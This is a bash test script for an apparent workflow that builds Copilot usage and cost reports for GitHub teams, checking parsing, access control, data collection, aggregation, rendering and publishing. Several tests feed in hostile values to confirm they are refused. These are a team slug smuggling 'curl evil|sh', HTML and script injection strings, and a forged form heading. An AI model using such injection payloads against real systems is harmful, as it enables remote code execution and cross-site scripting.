#!/usr/bin/env bash
# tests/run.sh - offline. A fake gh serves fixtures; report downloads are file:// URLs.
set -uo pipefail
cd "$(dirname "$0")/.." || exit 1
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
export PATH="$PWD/tests:$PATH" ORG_TOKEN=x REPO=CoolGitOrg/ops ISSUE=9
pass=0 fail=0
ok()  { pass=$((pass + 1)); printf 'ok   %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf 'FAIL %s\n     %s\n' "$1" "$2"; }
eq()  { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "want [$3] got [$2]"; fi; }
has() { if grep -Fq -- "$3" <<<"$2"; then ok "$1"; else bad "$1" "[$3] not in: ${2:0:400}"; fi; }
hasnt() { if grep -Fq -- "$3" <<<"$2"; then bad "$1" "[$3] present"; else ok "$1"; fi; }
fresh() { export FIX="$T/$1" GH_LOG="$T/$1/log"; mkdir -p "$FIX"; : >"$GH_LOG"; }
put() { printf '%s' "$2" >"$FIX/$1.json"; }
form() { printf '### Team\r\n\r\n%s\r\n\r\n### Period\r\n\r\n%s\r\n\r\n### Anything the reader should know\r\n\r\n### Team\r\nevil-team\r\n' "$1" "$2"; }
team() { put "orgs_CoolGitOrg_teams_$1" "{\"name\":\"Payments\",\"slug\":\"$1\",\"members_count\":$2}"; }
role() { put "orgs_CoolGitOrg_teams_$1_memberships_$2" "{\"state\":\"active\",\"role\":\"$3\"}"; }

# ---- parse
eq "parse: team"                         "$(form payments-platform '28 days' | scripts/parse-issue.sh team)" payments-platform
eq "parse: period"                       "$(form payments-platform '14 days' | scripts/parse-issue.sh period)" "14 days"
eq "parse: forged second heading ignored" "$(form good '7 days' | scripts/parse-issue.sh team)" good
eq "parse: empty field fails"            "$(form '' '7 days' | scripts/parse-issue.sh team >/dev/null 2>&1; echo $?)" 1

# ---- request.sh
fresh q1; team payments 14; role payments mona maintainer; put repos_CoolGitOrg_ops_issues '[]'
AUTHOR=mona BODY=$(form '@CoolGitOrg/Payments' '28 days') scripts/request.sh >/dev/null
has "request: maintainer admitted, dispatches" "$(cat "$GH_LOG")" 'workflows/copilot-team-report.lock.yml/dispatches {"ref":"main","inputs":{"team":"payments","days":"28","issue":"9","requested_by":"mona"}}'
has "request: lock labels"                     "$(cat "$GH_LOG")" '"labels":["team:payments"]'
fresh q2; team payments 14; role payments mona member
AUTHOR=mona BODY=$(form payments '28 days') scripts/request.sh >/dev/null
has "request: plain member refused"            "$(cat "$GH_LOG")" 'Your role in the team: `member`'
hasnt "request: plain member dispatches nothing" "$(cat "$GH_LOG")" dispatches
fresh q3; team payments 14; role copilot-admins root member; put repos_CoolGitOrg_ops_issues '[]'
AUTHOR=root BODY=$(form payments '7 days') scripts/request.sh >/dev/null
has "request: admins-team member admitted for any team" "$(cat "$GH_LOG")" dispatches
fresh q4; team tiny 3; role tiny mona maintainer
AUTHOR=mona BODY=$(form tiny '7 days') scripts/request.sh >/dev/null
has "request: small team refused"              "$(cat "$GH_LOG")" "at least 5"
fresh q5
AUTHOR=mona BODY=$(form 'pay;curl evil|sh' '7 days') scripts/request.sh >/dev/null
has "request: hostile slug refused before any lookup" "$(cat "$GH_LOG")" "must be a team slug"
AUTHOR=mona BODY=$(form payments '90 days') scripts/request.sh >/dev/null
has "request: period outside the list refused" "$(cat "$GH_LOG")" "must be one of"
fresh q6; team payments 14; role payments mona maintainer; put repos_CoolGitOrg_ops_issues '[{"number":4}]'
AUTHOR=mona BODY=$(form payments '7 days') scripts/request.sh >/dev/null
has "request: second run for a team refused"   "$(cat "$GH_LOG")" "already running"
fresh q7; role nope mona maintainer
AUTHOR=mona BODY=$(form nope '7 days') scripts/request.sh >/dev/null
has "request: unknown team refused"            "$(cat "$GH_LOG")" "no team"

# ---- collect.sh -> aggregate.py -> render.py, end to end
fresh c1; python3 tests/make_fixtures.py "$T/syn"
o=orgs_CoolGitOrg; t=${o}_teams_payments-platform
put "$t" '{"name":"Payments Platform","members_count":14}'
jq '[.[] | {login: (. | ascii_upcase)}]' "$T/syn/members.json" >"$FIX/${t}_members.json"          # API returns mixed case
put "${o}_copilot_metrics_reports_users-28-day_latest" "{\"download_links\":[\"file://$T/syn/usage.ndjson\"],\"report_start_day\":\"2026-08-24\",\"report_end_day\":\"2026-09-20\"}"
jq '{seats: [.[] | {assignee: {login}, plan_type}]}' "$T/syn/seats.json" >"$FIX/${o}_copilot_billing_seats.json"
put "${t}_repos" '[{"name":"payments-api","archived":false},{"name":"old","archived":true}]'
jq '[.[] | select(.repo=="payments-api") | {number, user:{login:.author}, base:{ref:.base}, merged_at, updated_at:.merged_at}] | sort_by(.updated_at) | reverse' "$T/syn/prs.json" >"$FIX/repos_CoolGitOrg_payments-api_pulls.json"
put repos_CoolGitOrg_payments-api_branches_main '{"protected":false}'
put repos_CoolGitOrg_payments-api_rules_branches_main '[{"type":"pull_request"}]'                      # ruleset, not classic protection
put repos_CoolGitOrg_payments-api_branches_spike_x '{"protected":false}'
put repos_CoolGitOrg_payments-api_rules_branches_spike_x '[]'
put repos_CoolGitOrg_payments-api_deployments '[{"id":1,"environment":"Production","created_at":"2026-09-10T00:00:00Z"},{"id":2,"environment":"staging","created_at":"2026-09-11T00:00:00Z"},{"id":3,"environment":"prod","created_at":"2026-09-12T00:00:00Z"}]'
put repos_CoolGitOrg_payments-api_deployments_1_statuses '[{"state":"in_progress"},{"state":"success"}]'
put repos_CoolGitOrg_payments-api_deployments_3_statuses '[{"state":"failure"}]'
NOW=2026-09-21 REQUESTED_BY=mona scripts/collect.sh payments-platform 28 "$T/c" 2>"$T/c.err"; rc=$?
eq  "collect: exits clean"                     "$rc" 0
eq  "collect: outsider filtered while streaming" "$(grep -ci outsider "$T/c/raw/usage.ndjson")" 0
eq  "collect: NDJSON and array both read"      "$(jq -s length "$T/c/raw/usage.ndjson")" "$(jq -s '[.[] | if type=="array" then .[] else . end | select(.user_login != "outsider")] | length' "$T/syn/usage.ndjson")"
eq  "collect: archived repo skipped"           "$(jq -c . "$T/c/raw/repos.json")" '["payments-api"]'
eq  "collect: ruleset counts as protection"    "$(jq '[.[] | select(.base=="main")] | all(.protected)' "$T/c/raw/prs.json")" true
eq  "collect: unprotected base marked"         "$(jq '[.[] | select(.base!="main")] | any(.protected)' "$T/c/raw/prs.json")" false
eq  "collect: only prod envs, success from statuses" "$(jq -c '[.[] | [.id,.success]]' "$T/c/raw/deployments.json")" '[[1,true],[3,false]]'
has "collect: missing optional source becomes a note" "$(jq -r '.notes[]' "$T/c/raw/meta.json")" "per-repository Copilot report was unavailable"
eq  "collect: window"                          "$(jq -r '.since+" "+.until' "$T/c/raw/meta.json")" "2026-08-24 2026-09-20"
eq  "collect: bad slug dies"                   "$(scripts/collect.sh 'a b' 28 "$T/x" >/dev/null 2>&1; echo $?)" 1

python3 scripts/aggregate.py "$T/c/raw" "$T/c/out" >/dev/null
d="$T/c/out/report-data.json"
eq  "aggregate: every tier populated"          "$(jq -c '.tiers | [.power,.heavy,.medium,.light,.inactive] | map(. > 0) | all' "$d")" true
eq  "aggregate: mixed-case login matched"      "$(jq '[.users[] | select(.login=="bnakamura")][0].events > 0' "$d")" true
eq  "aggregate: agent features carry no acceptance rate" "$(jq -c '[.features[] | select(.agent) | .acceptance_rate] | unique' "$d")" '[null]'
eq  "aggregate: not_accepted = shown - accepted, agents excluded" "$(jq '[.features[] | select(.agent|not) | .generations - .accepted] | add' "$d")" "$(jq .totals.not_accepted "$d")"
eq  "aggregate: cost = credits x 0.01"         "$(jq '.totals | (.credits * 0.01 * 100 | round) == (.cost_usd * 100 | round)' "$d")" true
eq  "aggregate: unit cost uses successful prod deploys only" "$(jq '.totals.prod_deployments' "$d")" 1
eq  "aggregate: outsider PRs not counted"      "$(jq '[.repos[].by_members] | add' "$d")" "$(jq --slurpfile m "$T/syn/members.json" '[.[] | select(.protected and (.author as $a | $m[0] | index($a)))] | length' "$T/c/raw/prs.json")"
eq  "aggregate: summary for the agent is compact" "$(jq 'has("truncated") and (.users | length) <= 60' "$T/c/out/summary.json")" true
echo '[]' >"$T/empty.json"; mkdir -p "$T/e"; cp "$T/c/raw/"{meta,members}.json "$T/e/"
python3 scripts/aggregate.py "$T/e" "$T/eo" >/dev/null
eq  "aggregate: no usage -> all inactive, null unit costs, no crash" "$(jq -c '[.tiers.inactive, .totals.cost_per_merged_pr, .totals.acceptance_rate]' "$T/eo/report-data.json")" '[14,null,null]'

printf '{"headline":"H <img src=x onerror=1>","findings":"- **b** `c` </script><script>x","recommendations":"- r"}' >"$T/ins.json"
python3 scripts/render.py "$d" "$T/r.html" "$T/ins.json" >/dev/null
h=$(cat "$T/r.html")
hasnt "render: agent prose cannot inject markup"  "$h" '<img src=x'
eq    "render: exactly two </script> tags; embedded JSON cannot close its own" "$(grep -o '</script>' "$T/r.html" | wc -l | tr -d ' ')" 2
eq    "render: no external resource of any kind" "$(grep -Eoc '(src|href)="(https?:)?//' "$T/r.html")" 0
has   "render: states unit costs"                "$h" "for each of"
python3 scripts/render.py "$T/eo/report-data.json" "$T/e.html" >/dev/null
has   "render: empty team renders, says why"     "$(cat "$T/e.html")" "Nothing merged into a protected branch"

# ---- publish.sh
fresh p1
DATA="$d" ARTIFACT_URL=https://x/y scripts/publish.sh baseline
has "publish: baseline frees the team lock"    "$(cat "$GH_LOG")" "DELETE /repos/CoolGitOrg/ops/issues/9/labels/report:running"
has "publish: baseline quotes unit cost"       "$(cat "$GH_LOG")" "Per production deployment"
fresh p2
DATA="$d" HEADLINE="Two people are half the spend." scripts/publish.sh final
has "publish: final closes completed"          "$(cat "$GH_LOG")" '"state_reason":"completed"'
eq  "publish: non-numeric issue refused"       "$(ISSUE='9;x' DATA="$d" scripts/publish.sh final >/dev/null 2>&1; echo $?)" 1

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
